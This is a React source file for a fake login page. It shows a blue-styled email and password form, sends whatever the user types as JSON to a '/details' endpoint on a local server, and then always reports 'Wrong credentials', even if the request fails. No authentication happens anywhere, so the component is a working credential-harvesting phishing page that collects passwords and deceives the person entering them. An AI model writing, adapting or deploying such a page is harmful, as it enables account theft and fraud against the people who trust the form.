import React, { useState } from 'react';

function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      await fetch('http://localhost:5000/details', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      // Always show an alert with "Wrong credentials"
      alert('Wrong credentials');
    } catch (error) {
      alert('Wrong credentials');
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.loginBox}>
        <h2>Login</h2>
        <form onSubmit={handleSubmit}>
          <div style={styles.inputGroup}>
            <label>Email:</label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              style={styles.input}
            />
          </div>
          <div style={styles.inputGroup}>
            <label>Password:</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              style={styles.input}
            />
          </div>
          <button type="submit" style={styles.button}>Login</button>
        </form>
      </div>
    </div>
  );
}

const styles = {
  container: {
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    height: '100vh',
    backgroundColor: '#007BFF', // Blue background
  },
  loginBox: {
    backgroundColor: 'white',
    padding: '2rem',
    borderRadius: '8px',
    boxShadow: '0px 4px 10px rgba(0, 0, 0, 0.2)',
    textAlign: 'center',
    width: '350px',
  },
  inputGroup: {
    display: 'flex',
    flexDirection: 'column',
    marginBottom: '15px',
    textAlign: 'left',
  },
  input: {
    padding: '10px',
    border: '1px solid #ccc',
    borderRadius: '5px',
    fontSize: '16px',
  },
  button: {
    backgroundColor: '#007BFF',
    color: 'white',
    border: 'none',
    padding: '10px',
    width: '100%',
    borderRadius: '5px',
    cursor: 'pointer',
    fontSize: '16px',
  },
};

export default Login;
